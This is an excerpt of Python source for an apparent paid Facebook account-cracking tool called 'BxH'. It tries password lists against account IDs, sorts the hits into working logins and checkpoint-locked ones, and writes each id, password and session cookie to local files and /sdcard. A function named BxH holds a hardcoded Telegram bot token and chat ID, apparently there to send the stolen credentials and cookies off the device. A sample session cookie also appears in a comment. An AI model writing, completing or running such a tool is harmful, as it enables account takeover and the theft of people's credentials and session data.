...
def BxH(idf,pw,kuki):
    try:
        token = "7010579136:AAG6Xqd_tohbcbJOScva61NMwsCX_-A42dc"
        chatid = "7153601585"
...
#------------------[ LOGO-LAKNAT ]-----------------#
logo=("""\033[1;32m  	
     ____ ________ __  ____________ __  __
   / __ <  / ___// / / /__  / ___// / / /
  / __  / /\__ \/ /_/ / /_ <\__ \/ /_/ / 
 / /_/ / /___/ / __  /___/ /__/ / __  /  
/_____/_//____/_/ /_//____/____/_/ /_/              
==========================================
Facebook:Th'w Bishesh
Version:0.1
Status:Paid
==========================================                           
""")
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r \u001b[37m[BxH-Crack] {loop}/{len(id)} OK[{H}{ok}\u001b[37m] [{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
...
'bi_xrwh': 0
  ...
  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    ...
    # 'cookie': 'datr=Ui08Zt5glVlDMhSBRVnu_pHf; sb=Ui08ZmjhQmub5Ky5PCkRRPuH; ps_n=1; ps_l=1; m_pixel_ratio=2.4000000953674316; wd=450x831; fr=0meimKQtjuUhLzTvj..BmPC1S..AAA.0.0.BmPLlq.AWULUT6Jx64',
    ...
    'viewport-width': '980',
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print(f'\r{P}{H} [BxH-OK] {H}{idf}|{pw}\n{P}[{H}COOKIE]{P}\033[1;31m{kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				open('/sdcard/BxH-OK.txt', 'a').write( idf+' | '+pw+' | '+kuki+'\n')
				BxH(idf,pw,kuki)
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}[{K}BxH-CP{P}] {K}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				open('/sdcard/BxH-CP.txt', 'a').write( idf+' | '+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r \u001b[37m[BxH-BxH] {loop}/{len(id)} OK[{H}{ok}\u001b[37m] [{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}{K} [{time.strftime("BxH")}-CP] {idf} │ {pw} {P}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}{H} [{time.strftime("BxH")}-OK] {idf} │ {pw} {P}')
				cek_apk(kuki)
